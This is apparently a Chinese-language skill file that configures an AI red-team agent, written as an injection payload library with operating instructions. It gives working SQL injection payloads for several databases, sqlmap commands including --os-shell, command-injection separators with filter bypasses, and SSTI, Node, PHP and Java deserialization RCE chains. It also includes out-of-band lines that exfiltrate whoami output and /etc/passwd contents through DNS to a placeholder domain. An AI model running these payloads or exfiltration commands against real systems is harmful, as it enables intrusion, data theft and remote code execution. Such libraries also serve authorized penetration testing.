---
name: injection-payloads
description: 注入类载荷库：SQLi / 命令注入 / 代码注入，含判定信号、绕过与无回显外带
whenToUse: 已找到参数或拼接点，需要确认注入并拿到数据 / RCE 时
role: vuln-scan
enabled: true
---

# 注入类载荷库（SQLi / 命令注入 / SSTI / 反序列化）

## 先确认本机有什么

`sqlmap` 不一定装。**先探，再点名**：

```bash
command -v sqlmap || ls ~/.dsh/redteam/toolkit 2>/dev/null || where.exe sqlmap 2>/dev/null
# 没有就用手工 payload（下面全套不依赖 sqlmap），别假装有工具
```

## SQLi：判定 → 提数 → 落地

**① 布尔差分（最可靠，不依赖报错）**

```text
' AND 1=1 -- -        基线应正常
' AND 1=2 -- -        应可观测地变短 / 变空 / 变慢
```

判定信号：响应**长度差**或行数差，不是"看起来不一样"。用固定对比：

```bash
for p in "' AND 1=1 -- -" "' AND 1=2 -- -"; do
  curl -s -G --data-urlencode "id=1$p" http://TARGET/ENDPOINT | wc -c
done
```

**② 时间盲注（无回显时用）**

```text
MySQL     ' AND SLEEP(5) -- -          延时 ≈5s 即命中
Postgres  ' AND pg_sleep(5) -- -
MSSQL     '; WAITFOR DELAY '0:0:5' --
Oracle    ' AND (SELECT 1 FROM dual WHERE 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=0) -- -
```

> 延时判定要**跑 3 次取中位数**，网络抖动 2s 很常见，单次 5s 不算证据。

**③ 报错注入（快速定库型）**

```text
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e)) -- -     MySQL
' AND 1=CAST(VERSION() AS INT) -- -                        Postgres
' AND 1=CONVERT(int,@@version) -- -                        MSSQL
```

**④ UNION 提数（先数列数、再找回显位）**

```text
' ORDER BY 1,2,3,4,5 -- -          递增到报错，得到列数
' UNION SELECT NULL,NULL,NULL -- - 逐个换成字符串定位回显列
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=DATABASE() -- -
```

**⑤ sqlmap（有工具时，别乱加 level 把靶打挂）**

```bash
sqlmap -u "http://TARGET/ENDPOINT?PARAM=1" --batch --random-agent --level=2 --risk=2 \
  --dbms=mysql --threads=4 --technique=BEUSTQ -o /tmp/sqlmap.csv
sqlmap -u "http://TARGET/ENDPOINT?PARAM=1" --batch --os-shell   # 需要写权限与可解析路径
```

## 命令注入

**分隔符全集（逐个试，过滤是逐条命中的）**

```text
;id  |id  ||id  &&id  &id  $(id)  `id`  ${IFS}id  %0aid
;tail -c 20 /etc/passwd     # 有回显
;sleep 5                    # 无回显改延时
```

**无回显 → 外带（这是最常见的卡点）**

```bash
;curl http://OOB.$(id).OAST_DOMAIN          # DNS 外带，子域标签带出结果
;ping -c 1 $(whoami).OAST_DOMAIN
;nslookup $(cat /etc/passwd|tr -d '\n'|cut -c1-20).OAST_DOMAIN   # 注意 63 字符标签上限，分段
```

**空格 / 关键字被过滤**

```text
$IFS、${IFS}、<、<>、{cat,passwd}、cat<passwd
ca''t、c\at、/bin/cat、$(echo Y2F0|base64 -d)
```

**Windows 目标（pwsh/cmd）**

```text
;whois  |whoami  &whoami  &&whoami  %0d%0awhoami
;ping -n 5 127.0.0.1        # 无回显延时
;curl http://OAST_DOMAIN/$(whoami)
```

## 代码注入 / 反序列化（定语言再打）

| 栈 | 判定 | 打点 |
| --- | --- | --- |
| PHP | `${phpinfo()}` 参数注入、`eval` 拼接 | `system('id')`；phar 反序列化需上传点 |
| Java | 报错含 `ObjectInputStream` / `Serializable` | ysoserial 生成 CC 链，base64 后回传；Fastjson/Jackson `@type` |
| Python | `{{7*7}}` 渲染出 49 = SSTI | Jinja2 `{{config}}` → `{{''.__class__.__mro__[1].__subclasses__()}}` → `popen('id').read()` |
| Node | `child_process` 拼接 | `require('child_process').execSync('id')`；原型污染 `__proto__` |
| .NET | `BinaryFormatter` / ViewState | 反序列化 gadget，ViewState 需 machinekey |

**SSTI 一步定栈**（最便宜的探测，先做）：

```text
{{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>  {* 7*7 *}
```

回显 `49` 的那个分隔符就是模板引擎，再按引擎打 RCE。

## 失败分支

- **有注入但 WAF 拦 `--`** → 换 `#`（MySQL）、`/*|*/`、`)` 闭合、URL 编码 `%2d%2d`。
- **参数化查询打不动** → 别硬磕：转 `order by` 注入、`IN ()` 拼接、二阶注入（存进去再取出的地方）。
- **无回显也无外带出口**（出网被限）→ 改延时盲注逐字符，或看日志/文件写入路径。
- **sqlmap 报 `unable to connect`** → 先手工 curl 通不通、有没有 Cookie/Token 必填；sqlmap 不会替你处理登录态，加 `--cookie=` 或 `--data=`。

## 落库要求

- 每条命中 `redteam_vuln_add`：`type`（sqli / cmdi / ssti / deserialization）、**原始请求全文**、命中 payload 原文、判定依据（长度差 / 延时中位数 / 报错文本）。
- 拿到数据写 `evidence`：库名、表名、行数、截取的字段样例——**不要只写"存在 SQL 注入"**。
- `redteam_chain_add`：`stage_code=vuln-scan`，`tool` 写实际命令原文。
